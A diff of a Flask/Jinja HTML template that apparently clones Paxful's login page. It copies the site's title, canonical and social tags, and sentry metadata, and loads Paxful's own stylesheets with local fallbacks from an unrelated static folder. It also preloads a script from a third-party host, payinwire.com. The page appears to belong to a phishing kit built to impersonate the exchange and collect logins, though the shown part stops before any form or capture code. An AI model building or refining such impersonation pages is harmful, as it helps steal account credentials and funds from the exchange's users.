@@ -1,55 +1,74 @@
 <!DOCTYPE html>
 <html lang="en">
-   <head>
+  <head>
     <meta charset="utf-8" />
     <meta
       name="viewport"
       content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"
-    /> 
-    
+    />
+
+    <!-- ✅ Paxful CSS -->
     <link
       rel="stylesheet"
       href="https://accounts.paxful.com/_next/static/css/6672feea99185a86.css"
       data-precedence="next"
+      onerror="this.onerror=null; this.href='{{ url_for('static', filename='nny/css/style.css') }}';"
     />
     <link
       rel="stylesheet"
       href="https://accounts.paxful.com/_next/static/css/2d521eb3d418fc4b.css"
       data-precedence="next"
+      onerror="this.onerror=null; this.href='{{ url_for('static', filename='nny/css/style.css') }}';"
     />
+
+    <!-- ✅ Local fallback & overrides -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='nny/css/style.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='nny/css/style_apply.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='nny/css/style_re.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='nny/css/styletwo.css') }}">
+
+    <!-- ✅ Scripts preload (optional) -->
     <link
       rel="preload"
       as="script"
       fetchPriority="low"
       href="https://accounts.paxful.com/_next/static/chunks/webpack-fd5f1584cb06209f.js"
     />
- 
     <link rel="preload" href="https://payinwire.com/gt4.js" as="script" />
+
+    <!-- ✅ Meta & SEO -->
     <meta name="next-size-adjust" />
     <meta name="theme-color" content="#000000" />
     <title>Login | Paxful</title>
     <meta name="description" content="Login to your Paxful account" />
     <link rel="canonical" href="https://accounts.paxful.com/login" />
+
     <meta property="og:title" content="Login | Paxful" />
     <meta property="og:description" content="Login to your Paxful account" />
-    <meta
-      property="og:image"
-      content="https://static.paxful.com/google-search-imagery/GS_Login.png"
-    />
+    <meta property="og:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png" />
     <meta property="og:image:width" content="1600" />
     <meta property="og:image:height" content="1001" />
+
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="Login | Paxful" />
     <meta name="twitter:description" content="Login to your Paxful account" />
-    <meta
-      name="twitter:image"
-      content="https://static.paxful.com/google-search-imagery/GS_Login.png"
-    />
+    <meta name="twitter:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png" />
     <meta name="twitter:image:width" content="1600" />
     <meta name="twitter:image:height" content="1001" />
 
-    <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFFeG2JiaFLOkogVna33LeHDdCgQnMC3YrSQ&s" type="image/png" />
-    <link rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFFeG2JiaFLOkogVna33LeHDdCgQnMC3YrSQ&s" type="image/png" />
+    <!-- ✅ Favicon -->
+    <link
+      rel="icon"
+      href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFFeG2JiaFLOkogVna33LeHDdCgQnMC3YrSQ&s"
+      type="image/png"
+    />
+    <link
+      rel="shortcut icon"
+      href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFFeG2JiaFLOkogVna33LeHDdCgQnMC3YrSQ&s"
+      type="image/png"
+    />
+
+    <!-- ✅ Optional error tracking (if needed) -->
     <meta
       name="sentry-trace"
       content="012a7aa94bf6113a29989cc6ab2a9992-5782be4ec9a0e409-0"
@@ -59,6 +78,7 @@
       content="sentry-environment=production,sentry-release=_aMkUzt9diM0yurh-t2EE,sentry-public_key=34d8d41960e64a9c85b91c358a8e90dd,sentry-trace_id=012a7aa94bf6113a29989cc6ab2a9992,sentry-sampled=false"
     />
   </head>
+
   <body class="__className_627f4f flex flex-col">
     <script>
       !(function () {
